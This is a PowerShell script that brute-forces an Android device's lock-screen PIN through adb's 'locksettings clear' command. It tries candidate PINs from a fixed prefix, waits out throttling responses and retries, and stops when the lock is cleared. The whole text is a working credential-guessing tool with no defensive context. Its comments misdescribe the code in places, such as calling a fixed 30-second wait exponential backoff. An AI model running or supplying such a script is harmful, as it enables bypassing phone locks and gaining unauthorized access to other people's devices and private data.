# Fixed first three digits
$fixedPart = "12"

# Loop to generate the last two digits
for ($randomPart1 = 0; $randomPart1 -le 3; $randomPart1++) {
    for ($randomPart2 = 0; $randomPart2 -le 3; $randomPart2++) {
        # Generate the complete password
        $password = "$fixedPart$randomPart1$randomPart2"
        
        # Output test information
        Write-Host "Trying password: $password" -ForegroundColor Cyan

        # Use adb to clear the lock settings
        $command = & "C:\Users\r\Downloads\platform-tools\adb.exe" shell locksettings clear --old $password 2>&1

        # Output actual adb response for debugging
        Write-Host "ADB Output: $command" -ForegroundColor Magenta

        # Check the output to determine success
        if ($command -like "*didn't match*") {
            Write-Host "Password $password didn't match, trying next one." -ForegroundColor Red
            continue  # Continue with the next password

        } elseif ($command -like "*Request throttled*") {
                # Increase wait time after each throttle
                $waitTime = 30  # Exponential backoff
                Write-Host "Request throttled, waiting $waitTime seconds to retry..." -ForegroundColor Yellow
                Start-Sleep -Seconds $waitTime  # Wait for the specified time
                $randomPart2--  # Decrement to retry the last password
        } elseif ($command -like "*Lock credential cleared*" -or $command -like "*successful*") {
            Write-Host "Correct password, lock settings cleared: $password" -ForegroundColor Green
            break 2  # Stop all loops if the password is correct
        } else {
            # Output for unmatched cases
            Write-Host "Unmatched output: $command" -ForegroundColor Red
        }
    }

    # Reset retry count after each outer loop iteration
}
